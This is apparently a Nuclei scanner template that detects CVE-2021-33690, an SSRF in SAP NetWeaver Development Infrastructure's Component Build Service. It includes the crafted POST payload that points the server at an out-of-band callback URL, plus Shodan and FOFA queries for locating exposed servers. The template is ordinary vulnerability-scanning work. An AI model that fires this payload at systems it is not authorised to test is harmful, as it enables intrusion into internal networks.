id: CVE-2021-33690

info:
  name: SAP NetWeaver Development Infrastructure - Server Side Request Forgery
  author: DhiyaneshDK
  severity: critical
  description: |
    Server-Side Request Forgery (SSRF) vulnerability has been detected in the SAP NetWeaver Development Infrastructure Component Build Service versions - 7.11, 7.20, 7.30, 7.31, 7.40, 7.50The SAP NetWeaver Development Infrastructure Component Build Service allows a threat actor who has access to the server to perform proxy attacks on server by sending crafted queries. Due to this, the threat actor could completely compromise sensitive data residing on the Server and impact its availability.Note: The impact of this vulnerability depends on whether SAP NetWeaver Development Infrastructure (NWDI) runs on the intranet or internet. The CVSS score reflects the impact considering the worst-case scenario that it runs on the internet.
  impact: |
    Authenticated attackers can perform SSRF attacks to manipulate internal network resources, potentially accessing sensitive internal systems and data.
  remediation: Apply the latest firmware update provided by the vendor to mitigate this vulnerability.
  reference:
    - https://redrays.io/cve-2021-33690-server-side-request-forgery-vulnerability/
    - https://nvd.nist.gov/vuln/detail/CVE-2021-33690
    - https://launchpad.support.sap.com/#/notes/3072955
    - https://wiki.scn.sap.com/wiki/pages/viewpage.action?pageId=582222806
    - https://github.com/redrays-io/CVE-2021-33690
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.9
    cve-id: CVE-2021-33690
    cwe-id: CWE-918
    epss-score: 0.93259
    epss-percentile: 0.99793
    cpe: cpe:2.3:a:sap:netweaver_development_infrastructure:7.11:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: sap
    product: netweaver_development_infrastructure
    shodan-query:
      - html:"SAP NetWeaver"
      - http.html:"sap netweaver"
    fofa-query: body="sap netweaver"
  tags: cve2021,cve,oast,ssrf,sap,vkev,vuln

http:
  - raw:
      - |
        POST /tc.CBS.Appl/tcspseudo HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        CBS=http://{{interactsh-url}}&USER=1&PWD=1&REQ_CONFIRM_DELAY=2000&ACTION=CONFIGURE

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: word
        part: body
        words:
          - "Could not connect to the CBS"
# digest: 490a0046304402203d83903e0fb9d7b1485db0cd098987680adc5ce8156b58d30fbcd6f28a88e46f02204cad6df7dc46aed9d3116439654beed8bcf6c5de7105b749292fa40f1dc517c7:922c64590222798bb761d5b6d8e72950